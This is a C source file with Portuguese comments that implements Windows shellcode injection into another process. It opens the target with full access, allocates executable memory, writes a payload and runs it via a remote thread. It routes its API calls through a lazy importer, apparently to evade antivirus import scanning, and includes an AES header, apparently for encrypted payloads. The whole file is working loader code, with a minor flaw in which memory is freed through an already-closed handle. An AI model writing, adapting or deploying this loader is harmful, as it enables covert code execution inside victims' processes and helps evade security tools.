#include <stdio.h>
#include <windows.h>
#include "include/aes.h"
#include "include/injection.h"
#include "include/lazy_importer.hpp"

BOOL ShellcodeInjection( _In_ DWORD PID, _In_ PBYTE Payload, _In_ SIZE_T PayloadSize) {

    // Variáveis para injeção de código
    BOOL result = TRUE;
    DWORD TID = 0;
    DWORD OldProtect = 0;
    HANDLE hProcess = nullptr;
    HANDLE hThread = nullptr;
    PVOID remoteBuffer = nullptr;


    // Manipulação de processos
    hProcess = LI_FN(OpenProcess)(PROCESS_ALL_ACCESS, FALSE, PID);
    if (hProcess == nullptr) {
        print_error("OpenProcess");
        return FALSE;
    }

    // Alocando memória no processo remoto
    remoteBuffer = LI_FN(VirtualAllocEx)(hProcess, nullptr, PayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteBuffer == nullptr) {
        print_error("VirtualAllocEx");
        result = FALSE; goto CLEANUP;
    }

    okay("Endereço alocado na memória remota: 0x%p", remoteBuffer);

    // Escrevendo o shellcode na memória alocada do processo remoto
    LI_FN(WriteProcessMemory)(hProcess, remoteBuffer, Payload, PayloadSize, nullptr);

    // Criando uma thread remota para executar o shellcode
    hThread = LI_FN(CreateRemoteThread)(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, nullptr, 0, &TID);
    if (hThread == nullptr) {
        print_error("CreateRemoteThread");
        result = FALSE; goto CLEANUP;
    }

    okay("Shellcode injetado com sucesso!");

    // Esperando a thread remota finalizar
    LI_FN(WaitForSingleObject)(hThread, INFINITE);

CLEANUP:
    if (hThread) { 
        LI_FN(CloseHandle)(hThread);
        info("Fechando o handle do processo alvo ...");
    }

    if (hProcess) {
        LI_FN(CloseHandle)(hProcess);
        info("Fechando o handle do processo alvo ...");
    }
    if (remoteBuffer) {
        LI_FN(VirtualFreeEx)(hProcess, remoteBuffer, 0, MEM_RELEASE);
        info("Liberando a memória alocada no processo alvo ...");
    }
    return result;
}